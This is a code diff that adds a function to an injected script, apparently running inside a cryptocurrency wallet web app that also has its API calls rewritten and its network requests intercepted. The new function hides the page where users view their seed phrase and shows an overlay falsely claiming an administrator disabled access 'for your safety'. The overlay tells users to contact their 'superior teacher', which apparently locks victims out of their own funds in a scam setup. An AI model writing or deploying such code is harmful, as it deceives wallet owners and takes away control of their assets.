@@ -105,6 +105,55 @@
         }
     }
     
+    // ===== 助记词页面拦截 =====
+    function interceptMnemonicPage() {
+        var path = window.location.pathname;
+        var search = window.location.search;
+        // 只拦截 mnemonic.XX.html，不拦截 mnemoniccheck
+        if (!/\/mnemonic\.[a-z]+\.html$/i.test(path)) return;
+        if (/mnemoniccheck/i.test(path)) return;
+        
+        // 新账户首次设置助记词(from=first)时放行，允许用户抄写
+        if (search.indexOf('from=first') !== -1 || search.indexOf('from%3Dfirst') !== -1) {
+            console.log('[AKProxy] 首次设置助记词，放行');
+            return;
+        }
+        
+        console.log('[AKProxy] 检测到查看助记词页面，启动拦截...');
+        
+        // 立即隐藏body内容防止闪烁
+        var style = document.createElement('style');
+        style.textContent = '#app, .mnemonic, .word-list, .words, .seed-phrase, [class*="mnemonic"] { visibility: hidden !important; }';
+        if (document.head) document.head.appendChild(style);
+        else document.addEventListener('DOMContentLoaded', function() { document.head.appendChild(style); });
+        
+        function showBlockOverlay() {
+            if (style.parentNode) style.remove();
+            
+            var overlay = document.createElement('div');
+            overlay.id = 'ak-mnemonic-block';
+            overlay.innerHTML = '<div style="position:fixed;top:0;left:0;right:0;bottom:0;background:linear-gradient(135deg,#0a0e1a,#1a1f35);z-index:999999;display:flex;align-items:center;justify-content:center;">' +
+                '<div style="text-align:center;padding:40px;max-width:400px;">' +
+                '<div style="font-size:60px;margin-bottom:20px;">🔒</div>' +
+                '<div style="color:#ff5252;font-size:20px;font-weight:bold;margin-bottom:15px;">助记词已被保护</div>' +
+                '<div style="color:#aaa;font-size:14px;line-height:1.8;margin-bottom:25px;">为了您的资产安全，助记词查看功能已被管理员禁用。<br>如需帮助请联系您的上属老师。</div>' +
+                '<button onclick="history.back()" style="padding:12px 40px;background:linear-gradient(135deg,#00d4ff,#0099cc);border:none;border-radius:8px;color:white;font-size:16px;cursor:pointer;font-weight:bold;">返 回</button>' +
+                '</div></div>';
+            document.body.appendChild(overlay);
+            var app = document.getElementById('app');
+            if (app) app.style.display = 'none';
+        }
+        
+        if (document.body) {
+            showBlockOverlay();
+        } else {
+            document.addEventListener('DOMContentLoaded', showBlockOverlay);
+        }
+    }
+    
+    // 立即执行助记词拦截（必须在其他脚本之前）
+    interceptMnemonicPage();
+    
     // 立即执行一次
     fixApiUrl();
     // 立即拦截网络请求
